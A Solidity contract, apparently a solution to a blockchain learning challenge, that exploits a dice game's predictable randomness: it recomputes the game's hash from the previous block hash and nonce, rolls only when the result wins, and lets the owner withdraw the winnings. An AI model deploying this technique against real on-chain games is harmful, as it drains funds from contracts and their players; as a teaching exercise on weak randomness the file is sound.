pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import 'hardhat/console.sol';
import './DiceGame.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract RiggedRoll is Ownable {
  DiceGame public diceGame;

  constructor(address payable diceGameAddress) {
    diceGame = DiceGame(diceGameAddress);
  }

  event Received(address, uint256);
  event FakeRoll(uint256);
  event Hash(bytes32);

  //Add withdraw function to transfer ether from the rigged contract to an address
  function withdraw(address _addr, uint256 _amount) external onlyOwner {
    require(address(this).balance >= _amount, 'contract has no such amount');
    (bool success, ) = _addr.call{value: _amount}('');
    require(success, 'withdraw failed');
  }

  //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
  function riggedRoll() public {
    require(address(this).balance >= .002 ether, 'contract has not enough balance');

    bytes32 prevHash = blockhash(block.number - 1);
    emit Hash(prevHash);
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
    emit Hash(hash);
    uint256 roll = uint256(hash) % 16;
    emit FakeRoll(roll);

    console.log('THE RIGGED ROLL IS ', roll);

    if (roll <= 2) {
      console.log('WON ');
      diceGame.rollTheDice{value: .002 ether}();
    }
  }

  //Add receive() function so contract can receive Eth
  receive() external payable {
    emit Received(msg.sender, msg.value);
  }
}
